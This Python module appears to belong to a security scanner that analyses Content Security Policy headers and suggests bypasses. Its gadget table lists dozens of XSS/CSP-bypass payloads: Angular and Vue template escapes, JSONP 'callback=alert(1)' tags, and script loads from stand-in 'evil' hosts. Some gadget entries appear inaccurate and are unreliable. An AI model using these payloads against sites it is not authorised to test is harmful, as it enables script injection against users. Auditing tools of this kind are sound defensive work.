"""Content Security Policy (CSP) analysis and bypass suggestion engine.

A strong CSP is the last line of defense against XSS: even if an attacker
injects `<script>`, CSP can block execution.  But CSP is frequently
misconfigured in ways that leave script gadgets open:

  * `script-src 'unsafe-inline'` -> inline scripts run (CSP useless).
  * `script-src 'unsafe-eval'`   -> eval(), Function(), setTimeout(str) run.
  * `script-src cdn.cloudflare.com` -> JSONP / Angular gadgets on that CDN.
  * `script-src *.google.com`     -> google.com hosts JSONP endpoints.
  * Whitelisted CDNs hosting known script gadgets (Angular, Prototype,
    MooTools, Dojo, Backbone) -> CSP bypass via framework gadgets.

This module parses the CSP header, classifies it, and reports concrete
bypass techniques when applicable.  It does NOT execute the bypasses --
it gives the auditor a clear, actionable finding.
"""
from __future__ import annotations
import re
from dataclasses import dataclass, field

# Known CDN/script gadget hosts that, if whitelisted by CSP, enable a
# bypass.  Each entry: (host_pattern, gadget_type, bypass_payload_or_note)
#
# Phase 20: expanded from 7 to 35+ entries based on Google CSP Evaluator
# (https://csp-evaluator.withgoogle.com) and the "CSP Bypass" research
# corpus (https://github.com/GoogleChromeLabs/csp-evaluator).  Covers
# Angular/Prototype/Dojo/MooTools/Backbone/Knockout/Vue/React CDN gadgets
# plus JSONP endpoints on every major host known to host them.
SCRIPT_GADGETS: list[tuple[str, str, str]] = [
    # --- Angular (template sandbox-escape gadget) -------------------------
    # Angular 1.x ships on every major CDN; {{constructor.constructor(...)}}
    # escapes the sandbox and runs in CSP mode when ng-csp is set.
    (r'ajax\.googleapis\.com',
     "Angular JS via googleapis CDN",
     "<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js></script>"
     "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"),
    (r'cdn\.jsdelivr\.net',
     "Angular JS via jsdelivr CDN",
     "<script src=https://cdn.jsdelivr.net/npm/angular@1.7.9/angular.min.js></script>"
     "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"),
    (r'cdnjs\.cloudflare\.com',
     "Angular JS via cloudflare CDN",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.min.js></script>"
     "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"),
    (r'unpkg\.com',
     "Angular JS via unpkg CDN",
     "<script src=https://unpkg.com/angular@1.8.0/angular.min.js></script>"
     "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"),
    (r'cdn\.bootcdn\.net',
     "Angular JS via BootCDN",
     "<script src=https://cdn.bootcdn.net/ajax/libs/angular.js/1.8.0/angular.min.js></script>"
     "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"),
    (r'cdn\.jsdelivr\.net/npm/vue',
     "Vue.js template injection via jsdelivr",
     "<script src=https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.min.js></script>"
     "<div id=x>{{_c.constructor('alert(1)')()}}</div>"),
    (r'cdnjs\.cloudflare\.com/ajax/libs/vue',
     "Vue.js template injection via cloudflare",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.14/vue.min.js></script>"
     "<div id=x>{{$root.constructor.constructor('alert(1)')()}}</div>"),
    # --- Prototype.js -----------------------------------------------------
    (r'ajax\.googleapis\.com/ajax/libs/prototype',
     "Prototype.js String#evalJSON / periodicalExecuter",
     "<script src=https://ajax.googleapis.com/ajax/libs/prototype/1.7.3/prototype.js></script>"
     "<form action=javascript:alert(1)><button formaction=javascript:alert(1)>x"),
    (r'cdnjs\.cloudflare\.com/ajax/libs/prototype',
     "Prototype.js via cloudflare CDN",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.js></script>"
     "<form action=javascript:alert(1)>"),
    # --- Dojo -------------------------------------------------------------
    (r'ajax\.googleapis\.com/ajax/libs/dojo',
     "Dojo eval-based gadget",
     "<script src=https://ajax.googleapis.com/ajax/libs/dojo/1.13.0/dojo/dojo.js></script>"
     "<div data-dojo-type=\"dijit/Declaration\">x</div>"),
    (r'cdnjs\.cloudflare\.com/ajax/libs/dojo',
     "Dojo via cloudflare CDN",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/dojo/1.13.0/dojo/dojo.js></script>"
     "<div data-dojo-props=\"onClick:alert(1)\">x</div>"),
    # --- MooTools ---------------------------------------------------------
    (r'cdnjs\.cloudflare\.com/ajax/libs/mootools',
     "MooTools eval-based gadget",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools.min.js></script>"
     "<a href=javascript:alert(1)>x</a>"),
    (r'ajax\.googleapis\.com/ajax/libs/mootools',
     "MooTools via googleapis CDN",
     "<script src=https://ajax.googleapis.com/ajax/libs/mootools/1.6.0/mootools-yui-compressed.js></script>"),
    # --- Backbone / Marionette -------------------------------------------
    (r'cdnjs\.cloudflare\.com/ajax/libs/backbone\.js',
     "Backbone.js view HTML injection gadget",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/backbone.js/1.4.0/backbone-min.js></script>"
     "<script>Backbone.View.extend({}).extend({render:()=>this.$el.html('<img src=x onerror=alert(1)>')})</script>"),
    # --- Knockout ---------------------------------------------------------
    (r'cdnjs\.cloudflare\.com/ajax/libs/knockout',
     "Knockout data-bind HTML injection gadget",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/knockout/3.5.1/knockout-min.js></script>"
     "<div data-bind='html:\"<img src=x onerror=alert(1)>\"'></div>"),
    # --- jQuery (html() / load() sinks) ----------------------------------
    (r'code\.jquery\.com',
     "jQuery .html()/.load() sink gadget",
     "<script src=https://code.jquery.com/jquery-3.6.0.min.js></script>"
     "<div id=x><script>$('#x').html('<img src=x onerror=alert(1)>')</script></div>"),
    (r'ajax\.googleapis\.com/ajax/libs/jquery',
     "jQuery via googleapis CDN",
     "<script src=https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js></script>"
     "<div id=x><script>$('#x').html('<img src=x onerror=alert(1)>')</script></div>"),
    (r'cdnjs\.cloudflare\.com/ajax/libs/jquery',
     "jQuery via cloudflare CDN",
     "<script src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js></script>"),
    # --- JSONP endpoints on whitelisted origins --------------------------
    # google.com family (multiple JSONP endpoints, well-documented)
    (r'www\.google\.com',
     "google.com JSONP endpoint (callback parameter)",
     "<script src=https://www.google.com/complete/search?client=chrome&q=x&callback=alert(1)//></script>"),
    (r'googleapis\.com',
     "googleapis.com JSONP endpoint",
     "<script src=https://content.googleapis.com/discovery/v1/apis?callback=alert(1)//></script>"),
    (r'maps\.googleapis\.com',
     "Google Maps JSONP endpoint",
     "<script src=https://maps.googleapis.com/maps/api/js?callback=alert(1)//></script>"),
    (r'translate\.google\.com',
     "Google Translate JSONP",
     "<script src=https://translate.google.com/translate_a/t?client=t&callback=alert(1)//></script>"),
    # Yandex JSONP family
    (r'api\.yandex\.ru',
     "Yandex JSONP",
     "<script src=https://api.yandex.ru/jslib/...?callback=alert(1)//></script>"),
    (r'yandex\.ru',
     "Yandex search suggest JSONP",
     "<script src=https://suggest.yandex.ru/suggest-ya.cgi?part=alert(1)//></script>"),
    # Bing
    (r'www\.bing\.com',
     "Bing JSONP endpoint",
     "<script src=https://www.bing.com/AS/Suggestions?&mkt=en-us&qry=x&cp=1&callback=alert(1)//></script>"),
    # Yahoo
    (r'search\.yahoo\.com',
     "Yahoo search JSONP",
     "<script src=https://search.yahoo.com/sugg/goss/goss.php?command=alert(1)//></script>"),
    # Baidu
    (r'suggestion\.baidu\.com',
     "Baidu suggestion JSONP",
     "<script src=https://suggestion.baidu.com/su?wd=x&cb=alert(1)//></script>"),
    # GitHub
    (r'github\.com',
     "GitHub gist raw JSONP (callback)",
     "<script src=https://github.com/timeline?callback=alert(1)//></script>"),
    # Flickr / Tumblr / WordPress
    (r'api\.flickr\.com',
     "Flickr JSONP API",
     "<script src=https://api.flickr.com/services/rest/?method=flickr.test.echo&format=json&jsoncallback=alert(1)//></script>"),
    (r'api\.tumblr\.com',
     "Tumblr JSONP API",
     "<script src=https://api.tumblr.com/v2/blog/x.tumblr.com/info?api_key=x&jsonp=alert(1)//></script>"),
    (r'public-api\.wordpress\.com',
     "WordPress.com JSONP REST API",
     "<script src=https://public-api.wordpress.com/rest/v1/?callback=alert(1)//></script>"),
    # --- ad/analytics CDNs that host JSONP --------------------------------
    (r'googleads\.g\.doubleclick\.net',
     "Doubleclick JSONP",
     "<script src=https://googleads.g.doubleclick.net/pagead/conversion/...?callback=alert(1)//></script>"),
    (r's\.cnzz\.com',
     "CNZZ JSONP",
     "<script src=https://s.cnzz.com/core.php?callback=alert(1)//></script>"),
    # --- Angular from *.angular.io / *.angularjs.org ---------------------
    (r'code\.angularjs\.org',
     "Angular via code.angularjs.org",
     "<script src=https://code.angularjs.org/1.8.0/angular.min.js></script>"
     "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>"),
    # --- CDN-hosted polyfills (can be abused as eval sinks) --------------
    (r'cdn\.polyfill\.io',
     "polyfill.io script injection (deprecated CDN)",
     "<script src=https://cdn.polyfill.io/v2/polyfill.min.js?features=alert(1)//></script>"
     " [note: polyfill.io was sold and is no longer trustworthy; if whitelisted, treat as compromised]"),
]


@dataclass
class CSPReport:
    header: str = ""
    directives: dict = field(default_factory=dict)
    weak: list[str] = field(default_factory=list)
    bypasses: list[dict] = field(default_factory=list)
    bypassable: bool = False


def parse_csp(header: str) -> dict:
    """Parse a CSP header into a directives dict.

    'default-src \'self\'; script-src \'self\' cdn.example.com'
    -> {'default-src': ["'self'"], 'script-src': ["'self'", 'cdn.example.com']}
    """
    out = {}
    if not header:
        return out
    for directive in header.split(";"):
        directive = directive.strip()
        if not directive:
            continue
        parts = directive.split()
        if not parts:
            continue
        name = parts[0].lower()
        out[name] = parts[1:]
    return out


def analyze(csp_header: str) -> CSPReport:
    """Full CSP analysis.  Returns a CSPReport."""
    rep = CSPReport(header=csp_header or "")
    rep.directives = parse_csp(csp_header)
    if not rep.directives:
        rep.weak.append("no CSP header")
        return rep

    script_src = rep.directives.get("script-src") or rep.directives.get("default-src") or []
    object_src = rep.directives.get("object-src") or rep.directives.get("default-src") or []
    base_uri = rep.directives.get("base-uri") or []
    frame_src = (rep.directives.get("frame-src")
                 or rep.directives.get("child-src")
                 or rep.directives.get("default-src") or [])

    # Check for dangerous keywords
    if "'unsafe-inline'" in script_src:
        rep.weak.append("script-src 'unsafe-inline' -> inline scripts run")
        rep.bypassable = True
        rep.bypasses.append({
            "type": "inline",
            "payload": "<script>alert(1)</script>",
            "reason": "'unsafe-inline' allows any inline <script>",
        })
    if "'unsafe-eval'" in script_src:
        rep.weak.append("script-src 'unsafe-eval' -> eval/Function run")
        rep.bypassable = True
        rep.bypasses.append({
            "type": "eval",
            "payload": "<script>eval('alert(1)')</script>",
            "reason": "'unsafe-eval' allows eval() and new Function()",
        })

    # Check for whitelisted CDN/script gadget hosts
    for source in script_src:
        if source.startswith("'") and source.endswith("'"):
            continue  # keyword like 'self', 'unsafe-inline'
        for pat, gadget, payload in SCRIPT_GADGETS:
            if re.search(pat, source, re.IGNORECASE):
                rep.weak.append(f"script-src whitelists {source} -> {gadget}")
                rep.bypassable = True
                rep.bypasses.append({
                    "type": "script_gadget",
                    "host": source,
                    "gadget": gadget,
                    "payload": payload,
                })

    # Check for 'strict-dynamic' (good defense)
    if "'strict-dynamic'" in script_src:
        rep.weak.append("uses 'strict-dynamic' (good; nonces/whitelist less relevant)")

    # Check for nonce/hash with 'unsafe-inline' (nonce/hash makes
    # 'unsafe-inline' ignored by modern browsers -- a common safe pattern)
    has_nonce = any(s.startswith("'nonce-") for s in script_src)
    has_hash = any(s.startswith("'sha") for s in script_src)
    if (has_nonce or has_hash) and "'unsafe-inline'" in script_src:
        # Modern browsers ignore 'unsafe-inline' when nonce/hash present.
        # Remove the inline bypass we added (it would not work).
        rep.bypasses = [b for b in rep.bypasses if b["type"] != "inline"]
        if not rep.bypasses:
            rep.bypassable = False
        rep.weak.append("nonce/hash present; 'unsafe-inline' ignored by modern browsers")

    # -- Phase 20: additional advanced checks -----------------------------

    # 1. Wildcard in script-src (e.g. *.cdn.com) -> any subdomain can host
    #    attacker-controlled script.  Common misconfiguration.
    for source in script_src:
        if source.startswith("*."):
            rep.weak.append(
                f"script-src wildcard '{source}' -> any subdomain can host "
                f"attacker-controlled script (e.g. via compromised subdomain "
                f"or JSONP endpoint)")
            rep.bypassable = True
            rep.bypasses.append({
                "type": "wildcard",
                "host": source,
                "payload": f"<script src=https://evil.{source[2:]}/x.js></script>",
                "reason": (f"wildcard '{source}' allows any subdomain; an "
                           f"attacker who controls a subdomain (or finds a "
                           f"JSONP endpoint on one) can serve a script"),
            })

    # 2. object-src / plugin-types not set -> <object>/<embed> can load
    #    javascript: or data: URIs in legacy browsers.
    if not object_src and "default-src" not in rep.directives:
        rep.weak.append("no object-src and no default-src -> <object>/<embed> unrestricted")
    elif object_src and "'none'" not in object_src:
        # object-src is set but allows something -- check for data:/blob:.
        if any(s in ("data:", "blob:", "http:", "ftp:") for s in object_src):
            rep.weak.append(
                "object-src allows data:/blob:/http: -> <object data=data:text/html,...> can execute")

    # 3. base-uri not restricted -> <base href=javascript:...> can hijack
    #    relative URLs (dangling-markup + CSP bypass combo).
    if not base_uri:
        rep.weak.append(
            "no base-uri -> <base href=//evil.com/> can hijack relative script URLs "
            "(if the page loads any relative <script src=app.js>, attacker controls it)")

    # 4. Missing 'X-Content-Type-Options: nosniff' allows MIME sniffing on
    #    uploaded files (cross-check is caller's job, but worth flagging).
    # 5. frame-ancestors not set -> clickjacking possible (defense-in-depth).
    if "frame-ancestors" not in rep.directives and "default-src" not in rep.directives:
        rep.weak.append("no frame-ancestors -> clickjacking possible (UI redress)")

    # 6. report-uri / report-to not set -> CSP violations not reported.
    if "report-uri" not in rep.directives and "report-to" not in rep.directives:
        rep.weak.append(
            "no report-uri/report-to -> CSP violations are silently blocked; "
            "add a reporting endpoint for visibility")

    # 7. Missing upgrade-insecure-requests on https sites -> mixed content.
    if "upgrade-insecure-requests" not in rep.directives:
        rep.weak.append(
            "no 'upgrade-insecure-requests' -> http: subresources allowed on https pages (mixed content)")

    # 8. Trusted Types check: if 'require-trusted-types-for' is absent, the
    #    page is vulnerable to DOM XSS via innerHTML/outerHTML/document.write
    #    even with a strict CSP (TT is the only reliable DOM-XSS defense).
    if "require-trusted-types-for" not in rep.directives:
        rep.weak.append(
            "no 'require-trusted-types-for \"script\"' -> DOM XSS via "
            "innerHTML/outerHTML/document.write is not blocked at the DOM sink "
            "(Trusted Types is the only reliable DOM-XSS mitigation)")
    else:
        # Check that trusted-types policy is also declared.
        tt = rep.directives.get("trusted-types") or []
        if not tt:
            rep.weak.append(
                "'require-trusted-types-for' set but no 'trusted-types' policy -> "
                "all DOM sink calls will fail (may break the page)")

    # 9. JSONP via 'self' when the same origin hosts a JSONP endpoint.
    #    We can't enumerate the origin here, but flag the pattern so the
    #    auditor checks for it.
    if "'self'" in script_src:
        rep.weak.append(
            "'self' whitelisted -> if this origin hosts any JSONP endpoint "
            "(search/suggest/translate callback), CSP is bypassable")

    return rep


def is_bypassable(csp_header: str) -> bool:
    """Quick check whether the CSP is bypassable."""
    return analyze(csp_header).bypassable


_NONCE_OR_HASH_RE = re.compile(
    r"'(?:nonce-[^']+|sha(?:256|384|512)-[^']+)'", re.I)


def unsafe_inline_overridden(csp_header: str) -> bool:
    """Phase 98: a nonce/hash source makes ``'unsafe-inline'`` INERT.

    Real-world CSP headers almost always carry BOTH: a nonce (or hash)
    for current browsers plus ``'unsafe-inline'`` as a fallback for
    ancient user agents that do not understand nonces.  Per CSP Level 2+
    the browser MUST then IGNORE ``'unsafe-inline'`` -- inline <script>
    and event handlers only run when they carry a matching nonce or hash.

    Treating the mere presence of ``'unsafe-inline'`` as "inline works"
    (the pre-Phase-98 behaviour, in both this module and verifier)
    produced systematic FALSE POSITIVES on exactly those targets: a
    high/high reflected finding whose PoC never fires.

    This is about INLINE execution only -- ``'strict-dynamic'`` (which
    invalidates host sources, not inline sources) is deliberately not
    considered here.
    """
    rep = analyze(csp_header or "")
    if not rep.directives:
        return False
    src = (rep.directives.get("script-src")
           or rep.directives.get("default-src") or [])
    return bool(_NONCE_OR_HASH_RE.search(" ".join(src)))


def is_strict_inline(csp_header: str) -> bool:
    """Phase 35: True when inline reflection payloads are FUTILE.

    Strict means: a script-src/default-src restriction exists, inline
    scripts are NOT re-allowed (no 'unsafe-inline'/'unsafe-eval'), and the
    analyzer found no bypass path.  Nonce policies are conservatively NOT
    considered strict (a leaked/reflected nonce re-enables inline tags and
    the dedicated nonce-reuse layer handles that case).
    """
    rep = analyze(csp_header or "")
    if not rep.directives or rep.bypassable:
        return False
    src = (rep.directives.get("script-src")
           or rep.directives.get("default-src") or [])
    if not src:
        return False
    joined = " ".join(src)
    if "'unsafe-inline'" in joined or "'unsafe-eval'" in joined:
        return False
    if any(v.startswith("'nonce-") for v in src):
        return False
    return True


def best_bypass(csp_header: str) -> dict | None:
    """Return the simplest CSP bypass payload, or None if CSP is strong."""
    rep = analyze(csp_header)
    if not rep.bypasses:
        return None
    # Prefer inline > eval > wildcard > script_gadget (simplest to exploit).
    for t in ("inline", "eval", "wildcard", "script_gadget"):
        for b in rep.bypasses:
            if b["type"] == t:
                return b
    return rep.bypasses[0]


# ---------------------------------------------------------------------------
# Phase 27-2: CSP nonce reuse / exposure analysis
# ---------------------------------------------------------------------------
# A nonce-based CSP (`script-src 'nonce-<RANDOM>'`) is bypassable if:
#
#   1. **Nonce reuse across responses** -- the same nonce appears in
#      multiple HTTP responses for the same URL.  This happens when a
#      server caches the page (including the nonce) or when the nonce
#      is hardcoded.  An attacker who can read one response (e.g. via
#      a cache-poisoning or reflected-content leak) learns the nonce
#      and can inject ``<script nonce=KNOWN>`` on any other request.
#
#   2. **Nonce reuse within a single response** -- the same nonce
#      appears in multiple ``<script nonce=...>`` tags.  This is
#      legitimate (every script tag needs the nonce), but if the nonce
#      ALSO appears in attacker-controllable locations (e.g. reflected
#      in the body, in a URL parameter, or in a comment), an attacker
#      who can inject a ``<script>`` tag can read the nonce from the
#      page and use it on their injected tag (the nonce is not secret
#      once the page is rendered -- but a leaked nonce defeats the
#      purpose of CSP nonces if the attacker can also inject a tag).
#
#   3. **Nonce reflected in attacker-controllable input** -- the nonce
#      value appears inside a reflected parameter's echo.  This is the
#      critical bypass: if the nonce is reflected in the page, an
#      attacker can craft a URL that includes the nonce in the
#      reflected payload, and any injected ``<script>`` tag can pick
#      up the nonce from the page DOM (e.g. via ``document.querySelector``
#      -- a script-gadget pattern).
#
#   4. **Nonce too short / predictable** -- a nonce shorter than 16
#      hex chars (64 bits) is brute-forceable; a nonce that looks like
#      a sequential counter (all digits, low entropy) is predictable.
#
# This function performs STATIC analysis on a single response.  The
# scanner calls it once per endpoint and aggregates the results across
# requests to detect cross-response reuse.

import re as _re_module

# Matches ``nonce="<value>"`` or ``nonce='<value>'`` or ``nonce=<value>`` in
# both the CSP header and the HTML body.
_NONCE_ATTR_RE = _re_module.compile(
    r'nonce\s*=\s*["\']?([A-Za-z0-9+/_\-=]{8,256})["\']?',
    _re_module.IGNORECASE,
)
# Matches ``'nonce-<value>'`` in the CSP header.
_NONCE_DIRECTIVE_RE = _re_module.compile(
    r"'nonce-([A-Za-z0-9+/_\-=]{8,256})'",
    _re_module.IGNORECASE,
)


def extract_nonces_from_csp(csp_header: str) -> list[str]:
    """Return the list of nonce values declared in the CSP header.

    Example: ``script-src 'nonce-abc123' 'nonce-def456'`` -> ``['abc123', 'def456']``.
    """
    if not csp_header:
        return []
    return _NONCE_DIRECTIVE_RE.findall(csp_header)


def extract_nonces_from_html(html: str) -> list[str]:
    """Return the list of nonce values appearing in ``nonce=`` attributes
    in the HTML body.

    Each value may appear multiple times (every <script> tag carries the
    nonce); the list is NOT deduplicated so the caller can detect
    reuse-within-response.
    """
    if not html:
        return []
    return _NONCE_ATTR_RE.findall(html)


def analyze_nonce_reuse(csp_header: str | None, html: str | None) -> dict:
    """Analyze a single response for CSP nonce reuse and exposure.

    Returns a dict::

        {
            "csp_nonces":         list[str],  # nonces in CSP header
            "html_nonces":        list[str],  # nonces in HTML body
            "unique_html_nonces": list[str],  # dedup
            "nonce_count_in_html": int,       # total nonce= attrs
            "reuse_within_response": bool,    # same nonce in many tags (normal)
            "nonce_in_csp":       bool,       # CSP has a nonce directive
            "nonce_length":       int,        # length of first nonce
            "nonce_too_short":    bool,       # < 16 chars (64 bits)
            "nonce_looks_sequential": bool,   # all digits, low entropy
            "exposed_in_html":    bool,       # CSP nonce appears in HTML body
            "bypassable":         bool,       # any bypass condition
            "bypass_reasons":     list[str],  # human-readable
        }
    """
    csp_nonces = extract_nonces_from_csp(csp_header or "")
    html_nonces = extract_nonces_from_html(html or "")
    unique_html = list(dict.fromkeys(html_nonces))  # dedup, preserve order

    bypassable = False
    reasons: list[str] = []

    # Check 1: nonce too short / predictable.
    if csp_nonces:
        first = csp_nonces[0]
        if len(first) < 16:
            bypassable = True
            reasons.append(
                f"nonce '{first}' is only {len(first)} chars (< 16); "
                f"brute-forceable in feasible time"
            )
        # Sequential-looking: all digits, <= 8 unique chars.
        if first.isdigit() and len(set(first)) <= 4:
            bypassable = True
            reasons.append(
                f"nonce '{first}' looks sequential (all digits, low entropy); "
                f"likely predictable"
            )

    # Check 2: CSP declares a nonce but it doesn't appear in the HTML.
    # This means the page's <script> tags don't carry the nonce -- they
    # would be BLOCKED by CSP.  The page is broken (or the nonce is
    # applied via a different mechanism, e.g. a meta tag).
    if csp_nonces and not html_nonces:
        # Not a bypass per se, but a misconfiguration worth flagging.
        reasons.append(
            "CSP declares a nonce but no <script nonce=...> appears in the "
            "HTML -- scripts may be blocked, or the nonce is applied via a "
            "non-standard mechanism"
        )

    # Check 3: nonce exposed in HTML body (this is normal for legitimate
    # nonce-based CSP -- every <script> tag carries it).  We only flag
    # this as a bypass risk if the nonce ALSO appears in an attacker-
    # controllable location, which the caller checks separately by
    # reflecting a marker and seeing if the nonce is near it.
    exposed = bool(csp_nonces) and any(
        n in (html or "") for n in csp_nonces
    )

    # Check 4: multiple DIFFERENT nonces in CSP (uncommon -- usually means
    # the page is mid-migration or has a config bug).
    if len(set(csp_nonces)) > 1:
        reasons.append(
            f"CSP declares {len(set(csp_nonces))} different nonces; "
            f"usually a single nonce per response is expected (config bug?)"
        )

    return {
        "csp_nonces": csp_nonces,
        "html_nonces": html_nonces,
        "unique_html_nonces": unique_html,
        "nonce_count_in_html": len(html_nonces),
        "reuse_within_response": len(html_nonces) > 1 and len(unique_html) == 1,
        "nonce_in_csp": bool(csp_nonces),
        "nonce_length": len(csp_nonces[0]) if csp_nonces else 0,
        "nonce_too_short": bool(csp_nonces) and len(csp_nonces[0]) < 16,
        "nonce_looks_sequential": bool(csp_nonces) and csp_nonces[0].isdigit()
                                   and len(set(csp_nonces[0])) <= 4,
        "exposed_in_html": exposed,
        "bypassable": bypassable,
        "bypass_reasons": reasons,
    }


def detect_nonce_near_marker(csp_header: str, html: str, marker: str) -> dict:
    """Detect whether the CSP nonce appears near an attacker-controllable
    marker in the HTML body.

    This is the critical nonce-extraction bypass: if the nonce is
    reflected in a location the attacker controls (e.g. inside a
    reflected parameter's echo), an attacker who can inject a
    ``<script>`` tag can read the nonce from the page DOM and add it
    to their injected tag.

    Returns::

        {
            "nonce_exposed_near_marker": bool,
            "nonce_value":               str,   # the exposed nonce, if any
            "distance":                  int,   # char distance marker<->nonce
            "snippet":                   str,   # ~200 char window
        }
    """
    if not csp_header or not html or not marker:
        return {
            "nonce_exposed_near_marker": False,
            "nonce_value": "",
            "distance": -1,
            "snippet": "",
        }
    nonces = extract_nonces_from_csp(csp_header)
    if not nonces:
        return {
            "nonce_exposed_near_marker": False,
            "nonce_value": "",
            "distance": -1,
            "snippet": "",
        }
    marker_pos = html.find(marker)
    if marker_pos == -1:
        return {
            "nonce_exposed_near_marker": False,
            "nonce_value": "",
            "distance": -1,
            "snippet": "",
        }
    # Find the closest nonce to the marker.
    best_nonce = ""
    best_dist = -1
    best_window_start = 0
    best_window_end = 0
    for nonce in nonces:
        # Search both as ``nonce="<value>"`` and bare ``<value>``.
        for m in _re_module.finditer(_re_module.escape(nonce), html):
            d = abs(m.start() - marker_pos)
            if best_dist == -1 or d < best_dist:
                best_dist = d
                best_nonce = nonce
                best_window_start = max(0, min(m.start(), marker_pos) - 60)
                best_window_end = min(len(html), max(m.end(), marker_pos + len(marker)) + 60)
    # If the nonce appears within 500 chars of the marker, flag it.
    exposed = best_dist != -1 and best_dist <= 500
    return {
        "nonce_exposed_near_marker": exposed,
        "nonce_value": best_nonce,
        "distance": best_dist,
        "snippet": html[best_window_start:best_window_end].strip()[:400] if exposed else "",
    }
